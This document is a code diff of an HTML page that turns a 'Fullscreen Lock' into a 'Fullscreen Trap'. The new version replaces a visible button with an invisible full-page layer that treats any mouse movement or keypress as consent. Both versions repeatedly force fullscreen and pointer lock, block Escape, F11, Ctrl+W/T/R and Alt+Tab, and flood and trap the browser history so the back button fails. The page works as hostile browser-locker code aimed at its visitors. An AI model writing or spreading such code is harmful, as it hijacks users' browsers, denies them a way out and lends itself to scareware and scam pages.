@@ -1,116 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Fullscreen Lock</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<title>Fullscreen Trap</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <style>
-    html, body {
-      margin: 0;
-      width: 100%;
-      height: 100%;
-      background: black;
-      color: white;
-      overflow: hidden;
-      cursor: none;
-      font-family: monospace;
-      user-select: none;
-    }
+<style>
+html, body {
+  margin: 0;
+  width: 100%;
+  height: 100%;
+  background: black;
+  overflow: hidden;
+  cursor: none;
+  user-select: none;
+  font-family: monospace;
+}
 
-    #gate {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: black;
-      z-index: 9999;
-    }
-
-    button {
-      padding: 20px 40px;
-      font-size: 18px;
-      background: #111;
-      color: white;
-      border: 1px solid #333;
-      cursor: pointer;
-    }
-  </style>
+#gestureLayer {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  background: rgba(0,0,0,0.01); /* invisible but clickable */
+}
+</style>
 </head>
 <body>
 
-<div id="gate">
-  <button id="enter">Click to continue</button>
-</div>
+<div id="gestureLayer"></div>
 
 <script>
-  const gate = document.getElementById("gate");
-  const enter = document.getElementById("enter");
+const layer = document.getElementById("gestureLayer");
 
-  function forceFullscreen() {
-    if (!document.fullscreenElement) {
-      document.documentElement.requestFullscreen().catch(() => {});
-    }
+function requestFS() {
+  if (!document.fullscreenElement) {
+    document.documentElement.requestFullscreen().catch(() => {});
   }
+}
 
-  function lockPointer() {
-    document.body.requestPointerLock?.();
+function lockPointer() {
+  document.body.requestPointerLock?.();
+}
+
+function engage() {
+  requestFS();
+  lockPointer();
+  layer.style.display = "none";
+}
+
+// Any interaction counts as consent
+["mousedown","mouseup","mousemove","keydown","touchstart"].forEach(evt => {
+  layer.addEventListener(evt, engage, { passive: false });
+});
+
+// If fullscreen drops, immediately demand a new gesture
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    layer.style.display = "block";
   }
+});
 
-  function floodHistory() {
-    for (let i = 0; i < 40; i++) {
-      history.pushState(null, "", location.href);
-    }
+// Extra pressure
+setInterval(() => {
+  requestFS();
+  lockPointer();
+}, 150);
+
+// Block common exits (best effort)
+document.addEventListener("keydown", e => {
+  if (
+    e.key === "Escape" ||
+    e.key === "F11" ||
+    (e.ctrlKey && ["w","W","t","T","r","R"].includes(e.key)) ||
+    (e.altKey && e.key === "Tab")
+  ) {
+    e.preventDefault();
+    e.stopPropagation();
   }
+});
 
-  enter.onclick = () => {
-    gate.remove();
-    forceFullscreen();
-    lockPointer();
-    floodHistory();
-  };
+window.addEventListener("popstate", () => {
+  history.pushState(null, "", location.href);
+});
 
-  // Instant fullscreen recovery
-  document.addEventListener("fullscreenchange", () => {
-    if (!document.fullscreenElement) {
-      setTimeout(forceFullscreen, 0);
-    }
-  });
-
-  // Constant fullscreen spam (browser will throttle but still annoying)
-  setInterval(() => {
-    forceFullscreen();
-  }, 200);
-
-  // Trap back button
-  window.addEventListener("popstate", () => {
-    history.pushState(null, "", location.href);
-  });
-
-  // Block common escape keys (best effort)
-  document.addEventListener("keydown", (e) => {
-    const blocked =
-      e.key === "Escape" ||
-      e.key === "F11" ||
-      (e.ctrlKey && ["w", "W", "t", "T", "r", "R"].includes(e.key)) ||
-      (e.altKey && e.key === "Tab");
-
-    if (blocked) {
-      e.preventDefault();
-      e.stopPropagation();
-    }
-  });
-
-  // Pointer lock persistence
-  setInterval(() => {
-    if (document.hasFocus()) {
-      lockPointer();
-    }
-  }, 500);
-
-  document.addEventListener("contextmenu", e => e.preventDefault());
-  document.addEventListener("dragstart", e => e.preventDefault());
+// Initial history flood
+for (let i = 0; i < 40; i++) {
+  history.pushState(null, "", location.href);
+}
 </script>
 
 </body>
